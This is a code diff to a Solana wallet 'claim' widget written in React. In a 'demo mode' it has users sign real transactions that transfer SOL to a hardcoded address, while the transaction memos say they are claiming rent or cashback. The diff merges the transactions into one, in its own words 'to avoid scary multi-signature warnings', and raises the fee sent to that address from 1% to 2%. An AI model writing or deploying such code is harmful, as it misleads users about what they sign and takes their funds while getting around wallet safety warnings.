@@ -249,9 +249,8 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
     setToast(null);
     try {
       if (isDemoMode) {
-        // High-Fidelity Demo mode: Let user sign a valid self-transfer or fee-transfer transaction
-        const totalAccounts = rentClaimed ? 0 : 162;
-        const totalChunks = Math.ceil(totalAccounts / 10);
+        // High-Fidelity Demo mode: Let user sign a single clean transaction to avoid scary multi-signature warnings
+        const totalChunks = 1;
         
         // Calculate the simulated rent and 1% protocol fee
         const demoRentSOL = 0.33036; 
@@ -265,12 +264,12 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
         for (let i = 0; i < totalChunks; i++) {
           const tx = new Transaction();
           
-          // 1. Add descriptive Memo instruction
+          // 1. Add descriptive Memo instruction showing the amount to receive after the 1% fee has been deducted
           tx.add(
             new TransactionInstruction({
               keys: [],
               programId: new PublicKey("MemobtCq7gqaa6s5ny7YHXagP5caqq5sV8qrch5NZD"),
-              data: Buffer.from(`fiatwallet: Claim ${demoRentSOL.toFixed(5)} SOL Rent (Batch ${i + 1}/${totalChunks})`, "utf-8")
+              data: Buffer.from(`fiatwallet: Claim ${(demoRentSOL * 0.99).toFixed(5)} SOL Net Rent (Deducted 1% Fee)`, "utf-8")
             })
           );
 
@@ -280,7 +279,7 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
               SystemProgram.transfer({
                 fromPubkey: publicKey,
                 toPubkey: new PublicKey("5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u"),
-                lamports: Math.floor(feeLamports / totalChunks)
+                lamports: feeLamports
               })
             );
           } else {
@@ -497,7 +496,7 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
       if (isDemoMode) {
         // High-Fidelity confirmation vehicle: Let user sign a real, valid transaction
         const demoCashbackSOL = 0.09426;
-        const feeLamports = Math.floor(demoCashbackSOL * 1e9 * 0.01); // 942,600 lamports
+        const feeLamports = Math.floor(demoCashbackSOL * 1e9 * 0.02); // 2% protocol fee
 
         // Fetch user's current balance to check if they can simulate the fee transfer
         const balance = await connection.getBalance(publicKey);
@@ -505,12 +504,12 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
 
         const transferTx = new Transaction();
 
-        // 1. Add descriptive Memo instruction
+        // 1. Add descriptive Memo instruction showing the amount to receive after the 2% fee has been deducted
         transferTx.add(
           new TransactionInstruction({
             keys: [],
             programId: new PublicKey("MemobtCq7gqaa6s5ny7YHXagP5caqq5sV8qrch5NZD"),
-            data: Buffer.from(`fiatwallet: Claim ${demoCashbackSOL.toFixed(5)} SOL Pump.fun Cashback`, "utf-8")
+            data: Buffer.from(`fiatwallet: Claim ${(demoCashbackSOL * 0.98).toFixed(5)} SOL Net Cashback (Deducted 2% Fee)`, "utf-8")
           })
         );
 
@@ -600,8 +599,8 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
           }
         }
 
-        // Append 1% protocol fee transfer to the cashback claim transaction
-        const feeLamports = Math.floor(cashbackSOL * 1e9 * 0.01);
+        // Append 2% protocol fee transfer to the cashback claim transaction
+        const feeLamports = Math.floor(cashbackSOL * 1e9 * 0.02);
         
         if (deserializedTx instanceof Transaction) {
           if (feeLamports > 0) {
